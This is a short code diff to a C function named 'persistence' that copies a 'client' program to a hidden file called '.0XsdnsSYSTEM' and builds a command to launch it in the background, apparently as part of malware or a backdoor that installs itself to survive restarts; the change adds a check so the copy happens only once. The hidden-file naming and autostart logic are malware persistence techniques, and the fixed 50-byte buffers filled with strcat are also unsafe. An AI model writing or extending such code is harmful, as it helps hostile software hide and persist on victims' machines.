@@ -43,8 +43,11 @@ int persistence(char *get_path, FILE *fp)
     char command[50] = "cp client ";
     strcat(command, get_path);
     strcat(command, ".0XsdnsSYSTEM");
-    system(command);
-
+    if(access(".0XsdnsSYSTEM",F_OK) == -1)
+    {
+        system(command);
+    }
+    
     char write_home[50];
     strcpy(write_home, get_path);
     strcat(write_home, "./.0XsdnsSYSTEM &");
